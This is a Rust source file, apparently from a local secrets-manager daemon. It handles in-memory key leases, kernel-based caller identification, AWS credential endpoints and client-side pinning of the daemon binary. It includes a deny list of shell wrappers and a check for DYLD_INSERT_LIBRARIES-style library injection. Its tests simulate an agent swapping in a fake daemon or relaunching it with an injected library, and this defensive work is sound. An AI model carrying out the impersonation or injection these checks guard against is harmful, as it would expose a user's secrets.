//! `karambit daemon`: a small per-user background process that holds leases in RAM
//! and identifies callers through the kernel.
//!
//! - Socket: `<vault>/run/d.sock` in a 0700 dir. Peers are identified with
//!   `getsockopt(LOCAL_PEERTOKEN)`; the audit token's pid + pidversion can't be
//!   recycled, unlike a bare pid. Everything else (cwd, exe, ancestor chain) comes
//!   from the kernel too, never client-asserted RPC fields. Initial environment
//!   marker names are read from the kernel peer where available (agent.rs).
//! - Leases: the secret's DEK, unwrapped once with Touch ID when granted, kept only
//!   in this process's memory. Expiry/revoke/restart = it's gone. Nothing on disk.
//! - Lifetime: started on demand by the CLI/app; exits after `IDLE_SECS` with no
//!   leases, no AWS endpoints and no requests.
//! - AWS: per-run ECS-style credential endpoints on 127.0.0.1 with a random bearer
//!   token, so `aws` / SDKs fetch keys over HTTP instead of reading them from env.
//!
//! Protocol: one JSON request line, one JSON response line, per connection.

use crate::platform::helper::Prompt;
use anyhow::{Context, Result, anyhow, bail};
use base64::{Engine, engine::general_purpose::STANDARD as B64};
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};
use std::collections::HashMap;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::os::unix::fs::PermissionsExt;
use std::os::unix::net::{UnixListener, UnixStream};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use zeroize::Zeroizing;

use crate::agent;
use crate::aws::AwsCreds;
use crate::crypto::Dek;
use crate::lease::{CommandBinding, Grantee, LeaseInfo};
use crate::store::{self, Paths, now};

pub const IDLE_SECS: u64 = 20 * 60;
const SOCK: &str = "d.sock";

pub fn run_dir(p: &Paths) -> PathBuf {
    p.root.join("run")
}

pub fn sock_path(p: &Paths) -> PathBuf {
    run_dir(p).join(SOCK)
}

// ---------------------------------------------------------------- lease scope

/// Restrictions on a lease beyond who it's for. All optional; all must pass.
#[derive(Serialize, Deserialize, Clone, Debug, Default, PartialEq, Eq)]
pub struct Scope {
    /// Caller's working directory (kernel-reported) must be under this path.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cwd: Option<String>,
    /// Grant inputs are names/absolute paths; held grants contain canonical path + SHA-256.
    /// When set, shells (`sh -c`) are refused: they'd make it meaningless.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub cmds: Vec<CommandBinding>,
    /// Number of uses before the lease ends by itself.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub max_uses: Option<u32>,
}

pub const SHELLS: &[&str] = &["sh", "bash", "zsh", "fish", "dash", "ksh", "tcsh", "csh", "env", "xargs", "nohup", "sudo", "exec"];

impl Scope {
    pub fn is_empty(&self) -> bool {
        self.cwd.is_none() && self.cmds.is_empty() && self.max_uses.is_none()
    }
    pub fn label(&self) -> String {
        let mut v = Vec::new();
        if let Some(c) = &self.cwd {
            v.push(format!("in {c}"));
        }
        if !self.cmds.is_empty() {
            v.push(format!("only {}", self.cmds.iter().map(CommandBinding::label).collect::<Vec<_>>().join("/")));
        }
        if let Some(n) = self.max_uses {
            v.push(format!("{n} uses"));
        }
        v.join(", ")
    }
}

/// Expand "~/x" and resolve symlinks so cwd prefixes compare reliably.
pub fn canon_dir(p: &str) -> String {
    let p = match (p.strip_prefix("~/"), std::env::var("HOME")) {
        (Some(rest), Ok(h)) => format!("{h}/{rest}"),
        _ if p == "~" => std::env::var("HOME").unwrap_or_else(|_| p.into()),
        _ => p.to_string(),
    };
    std::fs::canonicalize(&p).map(|x| x.to_string_lossy().into_owned()).unwrap_or(p).trim_end_matches('/').to_string()
}

fn under(dir: &str, root: &str) -> bool {
    dir == root || dir.starts_with(&format!("{root}/"))
}

#[cfg(test)]
thread_local! {
    static USE_SCOPE_HOOK: std::cell::RefCell<Option<Box<dyn FnOnce()>>> = const { std::cell::RefCell::new(None) };
}

// ---------------------------------------------------------------- protocol

#[derive(Serialize, Deserialize, Debug, Clone, Copy, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum UnlockAction { Get, Reveal, Run, Copy, View, AwsDescribe }

impl UnlockAction {
    pub(crate) fn parse(action: &str) -> Result<Self> {
        match action {
            "get" => Ok(Self::Get), "reveal" => Ok(Self::Reveal), "run" => Ok(Self::Run),
            "copy" => Ok(Self::Copy), "view" => Ok(Self::View), "aws-describe" => Ok(Self::AwsDescribe),
            _ => bail!("unknown unlock action"),
        }
    }
    fn label(self) -> &'static str {
        match self { Self::Get => "get", Self::Reveal => "reveal", Self::Run => "run", Self::Copy => "copy", Self::View => "view", Self::AwsDescribe => "aws-describe" }
    }
}

// Paper is operation input, not an assertion of authority. Keep its owned wire
// representation zeroizing even when an outer intent refuses the operation.
fn serialize_paper<S: serde::Serializer>(text: &Zeroizing<String>, serializer: S) -> std::result::Result<S::Ok, S::Error> {
    serializer.serialize_str(text)
}
fn deserialize_paper<'de, D: serde::Deserializer<'de>>(deserializer: D) -> std::result::Result<Zeroizing<String>, D::Error> {
    String::deserialize(deserializer).map(Zeroizing::new)
}

/// Management input only. Debug must never expose authentication bytes.
#[derive(Serialize, Deserialize)]
#[serde(transparent)]
pub struct SourceCredential(
    #[serde(serialize_with = "serialize_paper", deserialize_with = "deserialize_paper")]
    pub Zeroizing<String>,
);
impl std::fmt::Debug for SourceCredential {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str("SourceCredential([REDACTED])")
    }
}

#[derive(Serialize, Deserialize, Debug)]
#[serde(tag = "op", rename_all = "snake_case")]
pub enum Req {
    ProfileTrust { path: String },
    ProfileRead { path: String },
    Kill { agent: Option<String>, session: Option<String>, all: bool, revive: bool },
    Call { tool: String, args: Vec<String> },
    SourceAdd { name: String, kind: String, endpoint: String, auth_method: String, policy: Value,
        credential: SourceCredential },
    SourceRemove { name: String },
    SourceRetarget { name: String, endpoint: Option<String>, credential: Option<SourceCredential>, policy: Option<Value> },
    SourceList,
    Resolve { reference: String, grant: Option<String>, context: Option<String> },
    Ping,
    Init { backup_recipient: Option<String> },
    StatusSelftest,
    PubKeys,
    HelperPin { stage_daemon: Option<std::path::PathBuf>, stage_helper: Option<std::path::PathBuf> },
    Add { name: String, value: String, tier: Option<crate::Tier>, agent_allowed: bool, public: bool, overwrite: bool },
    ChangePolicy { patterns: Vec<String>, tier: Option<crate::Tier>, agent_allowed: Option<bool>, public: Option<bool> },
    Delete { patterns: Vec<String> },
    ChangeConfig { key: String, value: String },
    UpgradeKeys,
    Recover { #[serde(serialize_with = "serialize_paper", deserialize_with = "deserialize_paper")] identity_text: Zeroizing<String> },
    /// `accept_loss`: the exact set of secrets the paper key cannot open that the human agrees to give up.
    RecoverFromPaper { #[serde(serialize_with = "serialize_paper", deserialize_with = "deserialize_paper")] identity_text: Zeroizing<String>, #[serde(default)] accept_loss: Vec<String> },
    RetireKeys,
    RetireKeysWithPaper { #[serde(serialize_with = "serialize_paper", deserialize_with = "deserialize_paper")] identity_text: Zeroizing<String> },
    RotateBackup { recipient: String },
    SsoPortalAdd { name: String, start_url: String, region: String },
    SsoPortalLimit { portal: String, minutes: Option<u32> },
    RefreshSsoRegistrations { names: Vec<String> },
    CompleteSsoLogin { session: crate::sso::Session },
    Unlock { names: Vec<String>, action: UnlockAction, context: Option<String>, cmd: Option<String>,
        #[serde(default)] gate_open: bool, sso_profile: Option<String>, #[serde(default)] ttl: u64 },
    Copy { name: String },
    RunUnredacted { command: String },
    /// Legacy wire compatibility only: client-supplied DEKs are always refused.
    Grant { leases: Vec<GrantItem> },
    HumanUnlock { names: Vec<String> },
    GrantLease { names: Vec<String>, grantee: Grantee, hours: f64, scope: Scope },
    /// Ask for leased DEKs for these secrets. `cmd` = the command the caller is about
    /// to run (argv[0] resolved), checked against `cmds` scope.
    Use { names: Vec<String>, cmd: Option<String> },
    /// Preparation only; no credentials, token or endpoint is returned.
    LaunchPrepare { #[serde(default)] allow_hosts: Vec<String>, #[serde(default)] jail: bool, refs: Vec<String>, #[serde(deserialize_with = "launch_env")] env: std::collections::BTreeMap<String, String>, target: PathBuf, argv: Vec<String>, cwd: PathBuf, aws: Option<String>,
        /// Owner's ambient environment size (bytes incl. exec pointers), for the up-front size check. Absent = 0.
        #[serde(default)] ambient_bytes: u64,
        /// `--no-redact`: honoured only if `RunUnredacted` was approved by this owner for this command.
        #[serde(default)] no_redact: bool },
    LaunchCancel { id: String },
    LaunchRedaction { id: String },
    LaunchBind { id: String },
    LaunchRedeem { token: String },
    Revoke { patterns: Vec<String> },
    List,
    /// Register an ECS-style AWS credential endpoint for one run. `creds` is the
    /// profile JSON. Returns url + token. Ends with `aws_close` or after `ttl` secs.
    AwsOpen { profile: String, creds: String, ttl: u64 },
    AwsClose { id: String },
    /// Internal login commit only: CompleteSsoLogin derives profiles and limit from
    /// the vault. This variant is not accepted from the wire; approval remains here.
    #[serde(skip_deserializing)]
    SsoSet {
        session: crate::sso::Session,
        profiles: Vec<crate::sso::SsoReg>,
        #[serde(default)]
        limit_minutes: Option<u32>,
    },
    /// Change a signed-in portal's sign-in limit, counted from when it signed in.
    /// Human only (shortening can sign it out now); lengthening or removing it asks
    /// for Touch ID.
    SsoLimit { portal: String, minutes: Option<u32> },
    /// Internal daemon-derived registrations only; never deserialized from the wire.
    #[serde(skip_deserializing)]
    SsoRegister { profiles: Vec<crate::sso::SsoReg> },
    SsoDiscover { portal: String },
    SsoImportPreview { portal: String, roles: Vec<crate::sso::DiscoveredRole> },
    SsoImport { portal: String, items: Vec<crate::sso::ImportItem>, tier: store::Tier, agent_allowed: bool, region: Option<String> },
    /// Forget registered SSO profiles (tightening: allowed from anyone).
    SsoForget { names: Vec<String> },
    /// Human only: drop one portal's session and profiles, or all portals if None.
    SsoLogout { portal: Option<String> },
    /// Session + registered profile summary (no secrets).
    SsoStatus,
    /// Internal Run endpoint issuance only. The DEK is derived by daemon Unlock;
    /// this variant cannot be deserialized from the wire.
    #[serde(skip_deserializing)]
    SsoOpen { name: String, dek: Option<String>, ttl: u64 },
    Shutdown,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct GrantItem {
    pub name: String,
    pub dek: String, // base64
    pub to: Grantee,
    /// For `Grantee::Session`: approved root (pid, start). Resolved by the granter.
    #[serde(default)]
    pub root: Option<(i32, u64)>,
    pub expires: u64,
    pub scope: Scope,
    pub by: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct LeaseView {
    #[serde(flatten)]
    pub info: LeaseInfo,
    pub scope: Scope,
    pub uses: u32,
}

// ---------------------------------------------------------------- client

#[cfg(test)]
type RequestHook = Box<dyn FnMut(&Paths, &Req) -> Result<Value>>;
#[cfg(test)]
thread_local! {
    pub(crate) static REQUEST_HOOK: std::cell::RefCell<Option<RequestHook>> = const { std::cell::RefCell::new(None) };
}

/// Containment-only, send-and-forget cleanup. Never spawn or await a response.
/// A full socket queue may refuse this best-effort close; endpoint TTL is the backstop.
pub fn close_endpoint_best_effort(p: &Paths, id: &str) {
    let mut stream = match crate::platform::connect_cleanup(&sock_path(p)) {
        Ok(stream) => stream,
        Err(_) => { close_warning(&mut std::io::stderr()); return; }
    };
    if let Ok(mut line) = serde_json::to_vec(&Req::AwsClose { id: id.into() }) {
        line.push(b'\n');
        let _ = stream.write_all(&line);
    }
    let _ = stream.shutdown(std::net::Shutdown::Write);
}

/// Cleanup warning must never panic (it runs inside Drop, possibly during unwind).
fn close_warning(sink: &mut dyn Write) {
    let _ = sink.write_all(b"karambit: could not connect to close SSO endpoint; expiry remains the backstop\n");
}

#[cfg(test)]
#[test]
fn close_warning_ignores_failing_sink() {
    struct Broken;
    impl Write for Broken {
        fn write(&mut self, _: &[u8]) -> std::io::Result<usize> { Err(std::io::ErrorKind::BrokenPipe.into()) }
        fn flush(&mut self) -> std::io::Result<()> { Err(std::io::ErrorKind::BrokenPipe.into()) }
    }
    close_warning(&mut Broken);
}

/// Send one request to the daemon, starting it if needed.
pub fn request(p: &Paths, req: &Req) -> Result<Value> {
    #[cfg(test)]
    if let Some(result) = REQUEST_HOOK.with(|h| h.borrow_mut().as_mut().map(|h| h(p, req))) { return result; }

    let path = sock_path(p);
    let mut s = match UnixStream::connect(&path) {
        Ok(s) => s,
        Err(_) => {
            spawn(p)?;
            let deadline = Instant::now() + Duration::from_secs(3);
            loop {
                match UnixStream::connect(&path) {
                    Ok(s) => break s,
                    Err(e) if Instant::now() > deadline => return Err(anyhow!("karambit daemon didn't start: {e}")),
                    Err(_) => std::thread::sleep(Duration::from_millis(30)),
                }
            }
        }
    };
    // Before any request bytes (an `add` carries the value) leave this process.
    if !recovers_pin(req) { verify_daemon(&path, &s)?; }
    s.set_read_timeout(Some(Duration::from_secs(120)))?;
    {
        // Requests may carry a paper identity: encode into one zeroizing buffer
        // (no intermediate Value/Vec copies) and wipe it before awaiting the reply.
        let line = encode_request(req, crate::audit::current_intent().as_deref())?;
        s.write_all(&line)?;
    }
    s.shutdown(std::net::Shutdown::Write).ok();
    let mut out = String::new();
    BufReader::new(s).read_line(&mut out)?;
    let v: Value = serde_json::from_str(out.trim()).context("daemon: bad response")?;
    if let Some(e) = v.get("error").and_then(Value::as_str) {
        bail!("{e}");
    }
    Ok(v)
}

/// Wire line for `req` (+ optional `audit_parent`), built in a single zeroizing buffer.
fn encode_request(req: &Req, parent: Option<&str>) -> Result<Zeroizing<Vec<u8>>> {
    // Size exactly first so the buffer never reallocates (a realloc would free an
    // unwiped copy of the paper identity).
    struct Count(usize);
    impl Write for Count {
        fn write(&mut self, b: &[u8]) -> std::io::Result<usize> { self.0 += b.len(); Ok(b.len()) }
        fn flush(&mut self) -> std::io::Result<()> { Ok(()) }
    }
    let mut count = Count(0);
    serde_json::to_writer(&mut count, req)?;
    let extra = parent.map_or(0, |p| p.len() * 6 + 20);
    let mut line = Zeroizing::new(Vec::with_capacity(count.0 + extra + 2));
    let cap = line.capacity();
    serde_json::to_writer(&mut *line, req)?;
    // Req is an internally tagged struct-like enum, so it always encodes as `{...}`.
    if line.last() != Some(&b'}') { bail!("request did not encode as a JSON object"); }
    if let Some(parent) = parent {
        line.pop();
        line.extend_from_slice(b",\"audit_parent\":");
        serde_json::to_writer(&mut *line, parent)?;
        line.push(b'}');
    }
    line.push(b'\n');
    debug_assert_eq!(line.capacity(), cap, "request buffer reallocated");
    Ok(line)
}

#[cfg(test)]
#[test]
fn paper_requests_encode_without_intermediate_value_and_keep_wire_shape() {
    let id = "AGE-SECRET-KEY-1SYNTHETICPAPERTESTVALUE";
    for req in [
        Req::Recover { identity_text: Zeroizing::new(id.into()) },
        Req::RecoverFromPaper { identity_text: Zeroizing::new(id.into()), accept_loss: vec![] },
        Req::RetireKeysWithPaper { identity_text: Zeroizing::new(id.into()) },
    ] {
        for parent in [None, Some("intent-1")] {
            let line = encode_request(&req, parent).unwrap(); // debug_assert: no realloc
            assert_eq!(line.last(), Some(&b'\n'));
            let v: Value = serde_json::from_slice(&line).unwrap();
            assert_eq!(v["identity_text"], id);
            assert_eq!(v["audit_parent"].as_str(), parent);
            // Round-trips through the daemon's own parser.
            let back: Req = serde_json::from_slice(&line).unwrap();
            assert_eq!(std::mem::discriminant(&back), std::mem::discriminant(&req));
        }
    }
}

#[cfg(test)]
#[test]
fn recover_from_paper_wire_accept_loss_is_optional() {
    // Older clients omit the field; it must default to "accept nothing".
    let old: Req = serde_json::from_value(json!({"op": "recover_from_paper", "identity_text": "AGE-SECRET-KEY-1X"})).unwrap();
    assert!(matches!(old, Req::RecoverFromPaper { accept_loss, .. } if accept_loss.is_empty()));
    let new: Req = serde_json::from_value(json!({"op": "recover_from_paper", "identity_text": "AGE-SECRET-KEY-1X", "accept_loss": ["a/b"]})).unwrap();
    assert!(matches!(new, Req::RecoverFromPaper { accept_loss, .. } if accept_loss == ["a/b"]));
}

/// Like `request`, but returns None instead of starting a daemon (for read-only
/// queries such as "are there leases?" that shouldn't spawn one).
pub fn request_if_running(p: &Paths, req: &Req) -> Option<Value> {
    UnixStream::connect(sock_path(p)).ok()?;
    match request(p, req) {
        Ok(v) => Some(v),
        Err(e) => {
            // An untrusted endpoint must not look like "no daemon running".
            if e.to_string().starts_with(UNTRUSTED_DAEMON) { eprintln!("karambit: {e}"); }
            None
        }
    }
}

/// Stop and re-pin carry no secret and are the way out when the pin no longer matches the
/// running daemon (e.g. after an upgrade); refusing them would leave no recovery path.
/// A fake daemon learns nothing from them and cannot change the pin file.
fn recovers_pin(req: &Req) -> bool { matches!(req, Req::Shutdown | Req::HelperPin { .. }) }

const UNTRUSTED_DAEMON: &str = "refusing to use an unverified daemon";

#[cfg(test)]
type ProcExeHook = Box<dyn Fn(i32) -> Option<String>>;
#[cfg(test)]
type ProcEnvHook = Box<dyn Fn(i32) -> Option<Vec<String>>>;
#[cfg(test)]
thread_local! {
    static PROC_EXE_HOOK: std::cell::RefCell<Option<ProcExeHook>> = const { std::cell::RefCell::new(None) };
    static PROC_ENV_HOOK: std::cell::RefCell<Option<ProcEnvHook>> = const { std::cell::RefCell::new(None) };
}

/// Kernel executable path of `pid`; tests may substitute it (no real daemon binary needed).
fn kernel_exe(pid: i32) -> Option<String> {
    #[cfg(test)]
    if let Some(path) = PROC_EXE_HOOK.with(|h| h.borrow().as_ref().map(|hook| hook(pid))) { return path; }
    agent::proc_exe(pid)
}

/// Names in `pid`'s initial environment; None when the kernel will not show them.
/// Test builds report a clean environment unless a hook says otherwise: cargo itself sets
/// DYLD_* for test binaries, and the in-process "daemon" there is the test binary.
fn kernel_env_names(pid: i32) -> Option<Vec<String>> {
    #[cfg(test)]
    return PROC_ENV_HOOK.with(|h| h.borrow().as_ref().map_or_else(|| Some(vec![]), |hook| hook(pid)));
    #[cfg(not(test))]
    agent::proc_env_names(pid)
}

/// dyld honours DYLD_* (e.g. DYLD_INSERT_LIBRARIES) in a binary that is not hardened-runtime
/// signed, so the pinned executable hash alone does not prove what code runs in the daemon.
fn dyld_name<S: AsRef<str>>(names: impl IntoIterator<Item = S>) -> Option<String> {
    names.into_iter().find(|n| n.as_ref().starts_with("DYLD_")).map(|n| n.as_ref().to_owned())
}

/// Debug builds only, and only with KARAMBIT_DEV=1 (the gate KARAMBIT_SE_HELPER uses): cargo runs
/// test binaries with DYLD_FALLBACK_LIBRARY_PATH, and a few tests make a cargo-built `karambit`
/// talk to the test process as its daemon. Compiled out of release builds.
#[cfg(debug_assertions)]
fn dev_allows_dyld_daemon() -> bool {
    std::env::var_os("KARAMBIT_DEV").is_some_and(|v| v == "1")
}
#[cfg(not(debug_assertions))]
fn dev_allows_dyld_daemon() -> bool { false }

/// The `karambit daemon` entry refuses to serve with DYLD_* in its own environment (see `dyld_name`).
pub fn refuse_dyld_environment() -> Result<()> {
    ensure_no_dyld_environment(std::env::vars_os().map(|(name, _)| name))
}

fn ensure_no_dyld_environment(names: impl IntoIterator<Item = std::ffi::OsString>) -> Result<()> {
    use std::os::unix::ffi::OsStrExt;
    match names.into_iter().find(|n| n.as_bytes().starts_with(b"DYLD_")) {
        Some(n) => bail!("refusing to start the daemon: {} is set; dyld could load code into it that the pin does not cover. Start it without DYLD_* variables", n.to_string_lossy()),
        None => Ok(()),
    }
}

/// (vault root, pid, pidversion) of daemons whose executable already matched the pin.
/// pidversion makes a recycled pid a cache miss; the root keeps vaults apart.
static VERIFIED_DAEMONS: Mutex<Vec<(PathBuf, i32, u32)>> = Mutex::new(Vec::new());

/// The run dir and socket must be ours and closed to group/other writers; otherwise
/// someone else could replace the endpoint we are about to talk to.
fn check_private_path(path: &Path, dir: bool, me_uid: libc::uid_t) -> Result<()> {
    use std::os::unix::fs::{FileTypeExt, MetadataExt};
    let meta = std::fs::symlink_metadata(path).with_context(|| format!("{UNTRUSTED_DAEMON}: {}", path.display()))?;
    let kind = if dir { meta.file_type().is_dir() } else { meta.file_type().is_socket() };
    if !kind || meta.uid() != me_uid || meta.mode() & 0o022 != 0 {
        bail!("{UNTRUSTED_DAEMON}: {} is not private to this user", path.display());
    }
    Ok(())
}

/// Client-side counterpart of the daemon's peer checks: the process listening on
/// `socket` must run an executable listed in `keys/daemon.sha256` (the pin that
/// `launch_bound` already uses), and must not have been started with DYLD_* in its
/// environment. Until the vault is initialized there is no pin to check and the old
/// behaviour stands; afterwards a missing pin is a refusal, not a pass. Call before
/// sending anything.
pub(crate) fn verify_daemon(socket: &Path, s: &UnixStream) -> Result<()> {
    let run = socket.parent().context(UNTRUSTED_DAEMON)?;
    let configured_root = run.parent().context(UNTRUSTED_DAEMON)?;
    // The vault root may itself be a symlink (e.g. to another volume): judge the real
    // directory. run/ and the socket below stay no-follow checks.
    let root = std::fs::canonicalize(configured_root).map_err(|e| anyhow!("{UNTRUSTED_DAEMON}: {}: {e}", configured_root.display()))?;
    let run = root.join(run.file_name().context(UNTRUSTED_DAEMON)?);
    let socket = run.join(socket.file_name().context(UNTRUSTED_DAEMON)?);
    let pins = match std::fs::read_to_string(root.join("keys").join("daemon.sha256")) {
        Ok(pins) => pins,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            // The same files `helper::require_fresh` treats as "not a fresh vault"; unknowable counts as initialized.
            let keys = root.join("keys");
            let initialized = [keys.join("bio.key"), keys.join("open.key"), keys.join("agent.key"), keys.join("pub.json"), root.join("config.json")]
                .iter().any(|path| path.try_exists().unwrap_or(true));
            if !initialized { return Ok(()); }
            bail!("{UNTRUSTED_DAEMON}: the daemon pin is missing from an initialized vault (run `karambit helper pin` in a terminal)");
        }
        Err(e) => return Err(anyhow!("{UNTRUSTED_DAEMON}: daemon pin unreadable: {e}")),
    };
    let me_uid = unsafe { libc::getuid() };
    check_private_path(&root, true, me_uid)?;
    check_private_path(&run, true, me_uid)?;
    check_private_path(&socket, false, me_uid)?;
    // The kernel's token for the listening process; also refuses another user.
    let (pid, version) = peer_token_of(s, me_uid).map_err(|e| anyhow!("{UNTRUSTED_DAEMON}: {e}"))?;
    let key = (root.clone(), pid, version);
    // The socket token is fixed when the socket was made: if that process has exec'd
    // since, the live pidversion differs. Checked even on a cache hit (cheap, no hashing).
    if live_pidversion(pid).map_err(|_| anyhow!("{UNTRUSTED_DAEMON}: its identity changed"))? != version {
        bail!("{UNTRUSTED_DAEMON}: its identity changed");
    }
    if VERIFIED_DAEMONS.lock().unwrap().contains(&key) { return Ok(()); }
    let exe = kernel_exe(pid).and_then(|path| std::fs::canonicalize(path).ok())
        .with_context(|| format!("{UNTRUSTED_DAEMON}: its executable is unknown"))?;
    let hash = crate::platform::helper::sha256_file(&exe).map_err(|e| anyhow!("{UNTRUSTED_DAEMON}: {e}"))?;
    if !pins.lines().any(|pin| pin.trim() == hash) {
        bail!("{UNTRUSTED_DAEMON}: {} is not the pinned karambit (see `karambit helper pin`)", exe.display());
    }
    // Unreadable environment fails closed: it could be hiding a DYLD_* variable.
    let names = kernel_env_names(pid).with_context(|| format!("{UNTRUSTED_DAEMON}: its environment is unreadable"))?;
    if let Some(name) = dyld_name(&names) && !dev_allows_dyld_daemon() {
        bail!("{UNTRUSTED_DAEMON}: it was started with {name} set");
    }
    VERIFIED_DAEMONS.lock().unwrap().push(key);
    Ok(())
}

#[cfg(test)]
mod verify_daemon_tests {
    use super::*;
    use std::os::unix::fs::symlink;

    /// A vault root with run/d.sock bound by this process (so the "daemon" runs the test binary).
    struct Endpoint { root: PathBuf, socket: PathBuf, _listener: UnixListener }
    impl Endpoint {
        fn new(pin: Option<&str>) -> Self {
            let root = PathBuf::from("/tmp").join(format!("karambit-verify-{:016x}", rand::random::<u64>()));
            store::ensure_dir(&root.join("run")).unwrap();
            store::ensure_dir(&root.join("keys")).unwrap();
            if let Some(pin) = pin { std::fs::write(root.join("keys").join("daemon.sha256"), pin).unwrap(); }
            let socket = root.join("run").join(SOCK);
            let listener = UnixListener::bind(&socket).unwrap();
            std::fs::set_permissions(&socket, std::fs::Permissions::from_mode(0o600)).unwrap();
            Self { root, socket, _listener: listener }
        }
        fn connect(&self) -> UnixStream { UnixStream::connect(&self.socket).unwrap() }
    }
    impl Drop for Endpoint {
        fn drop(&mut self) {
            PROC_EXE_HOOK.with(|h| h.borrow_mut().take());
            PROC_ENV_HOOK.with(|h| h.borrow_mut().take());
            let _ = std::fs::remove_dir_all(&self.root);
        }
    }
    fn own_hash() -> String {
        crate::platform::helper::sha256_file(Path::new(&agent::proc_exe(std::process::id() as i32).unwrap())).unwrap()
    }
    fn fake_binary(root: &Path, body: &[u8]) -> (PathBuf, String) {
        let path = root.join("fake-daemon");
        std::fs::write(&path, body).unwrap();
        let hash = crate::platform::helper::sha256_file(&path).unwrap();
        (path, hash)
    }
    fn exe_is(path: PathBuf) {
        PROC_EXE_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| Some(path.to_string_lossy().into_owned()))));
    }
    fn refused(e: &Endpoint) -> String {
        verify_daemon(&e.socket, &e.connect()).unwrap_err().to_string()
    }

    #[test]
    fn without_a_daemon_pin_the_old_behaviour_stands() {
        let e = Endpoint::new(None);
        let (fake, _) = fake_binary(&e.root, b"anything");
        exe_is(fake);
        verify_daemon(&e.socket, &e.connect()).unwrap();
    }

    #[test]
    fn pinned_daemon_is_accepted() {
        let e = Endpoint::new(Some(&format!("{}\n", own_hash())));
        verify_daemon(&e.socket, &e.connect()).unwrap();
    }

    #[test]
    fn listener_running_an_unpinned_executable_is_refused() {
        // Agent kills the daemon and serves its own binary on the same socket.
        let e = Endpoint::new(Some(&format!("{}\n", own_hash())));
        let (fake, _) = fake_binary(&e.root, b"fake daemon");
        exe_is(fake);
        assert!(refused(&e).starts_with(UNTRUSTED_DAEMON));
    }

    #[test]
    fn listener_running_a_pinned_executable_is_accepted_even_among_several_pins() {
        let e = Endpoint::new(None);
        let (fake, hash) = fake_binary(&e.root, b"older pinned daemon");
        std::fs::write(e.root.join("keys").join("daemon.sha256"), format!("{}\n\n{hash}\n", "0".repeat(64))).unwrap();
        exe_is(fake);
        verify_daemon(&e.socket, &e.connect()).unwrap();
    }

    #[test]
    fn empty_or_unreadable_pin_file_is_refused() {
        let e = Endpoint::new(Some(""));
        assert!(refused(&e).starts_with(UNTRUSTED_DAEMON));
        let dir = Endpoint::new(None);
        // A directory in place of the pin file: present but unreadable, not "absent".
        std::fs::create_dir(dir.root.join("keys").join("daemon.sha256")).unwrap();
        assert!(refused(&dir).starts_with(UNTRUSTED_DAEMON));
    }

    #[test]
    fn unknown_peer_executable_is_refused() {
        let e = Endpoint::new(Some(&own_hash()));
        PROC_EXE_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|_| None)));
        assert!(refused(&e).starts_with(UNTRUSTED_DAEMON));
    }

    #[test]
    fn verified_daemon_is_not_rehashed_on_the_next_request() {
        let e = Endpoint::new(Some(&own_hash()));
        verify_daemon(&e.socket, &e.connect()).unwrap();
        // Same (pid, pidversion): a later executable lookup would now fail, so a pass proves the cache.
        PROC_EXE_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|_| panic!("rehashed a verified daemon"))));
        verify_daemon(&e.socket, &e.connect()).unwrap();
    }

    #[test]
    fn run_dir_or_socket_open_to_group_or_other_writers_is_refused() {
        for (what, mode) in [("root", 0o770), ("dir", 0o770), ("dir", 0o707), ("sock", 0o660), ("sock", 0o606)] {
            let e = Endpoint::new(Some(&own_hash()));
            let target = match what { "root" => e.root.clone(), "dir" => e.root.join("run"), _ => e.socket.clone() };
            std::fs::set_permissions(&target, std::fs::Permissions::from_mode(mode)).unwrap();
            assert!(refused(&e).contains("not private to this user"), "{what} {mode:o}");
            // Restore so Drop can clean up.
            std::fs::set_permissions(&target, std::fs::Permissions::from_mode(if what == "sock" { 0o600 } else { 0o700 })).unwrap();
        }
    }

    #[test]
    fn symlinked_run_dir_is_refused() {
        let e = Endpoint::new(Some(&own_hash()));
        let link = e.root.join("link");
        symlink(e.root.join("run"), &link).unwrap();
        assert!(check_private_path(&link, true, unsafe { libc::getuid() }).is_err());
    }

    #[test]
    fn path_owned_by_another_uid_is_refused() {
        let e = Endpoint::new(None);
        let other = unsafe { libc::getuid() }.wrapping_add(1);
        assert!(check_private_path(&e.root.join("run"), true, other).is_err());
        assert!(check_private_path(&e.socket, false, other).is_err());
        assert!(check_private_path(&e.socket, true, unsafe { libc::getuid() }).is_err(), "a socket is not a directory");
    }

    fn env_is(names: Option<&'static [&'static str]>) {
        PROC_ENV_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| names.map(|n| n.iter().map(|s| s.to_string()).collect()))));
    }

    #[test]
    fn daemon_started_with_dyld_environment_is_refused() {
        // Same pinned binary, relaunched by an agent with an injected library.
        let e = Endpoint::new(Some(&own_hash()));
        env_is(Some(&["PATH", "DYLD_INSERT_LIBRARIES", "KARAMBIT_DIR"]));
        let error = refused(&e);
        assert!(error.starts_with(UNTRUSTED_DAEMON) && error.contains("DYLD_INSERT_LIBRARIES"), "{error}");
        env_is(Some(&["DYLD_LIBRARY_PATH"]));
        assert!(refused(&e).contains("DYLD_LIBRARY_PATH"));
        // Only a name prefix counts, not a value or a lookalike.
        env_is(Some(&["PATH", "XDYLD_INSERT_LIBRARIES", "KARAMBIT_DIR"]));
        verify_daemon(&e.socket, &e.connect()).unwrap();
    }

    #[test]
    fn dyld_refusal_is_not_cached_and_clean_environment_is_accepted() {
        let e = Endpoint::new(Some(&own_hash()));
        env_is(Some(&["DYLD_INSERT_LIBRARIES"]));
        assert!(refused(&e).contains("DYLD_"));
        env_is(Some(&["PATH", "KARAMBIT_DIR"]));
        verify_daemon(&e.socket, &e.connect()).unwrap();
    }

    #[test]
    fn unreadable_daemon_environment_fails_closed() {
        let e = Endpoint::new(Some(&own_hash()));
        env_is(None);
        let error = refused(&e);
        assert!(error.starts_with(UNTRUSTED_DAEMON) && error.contains("environment is unreadable"), "{error}");
    }

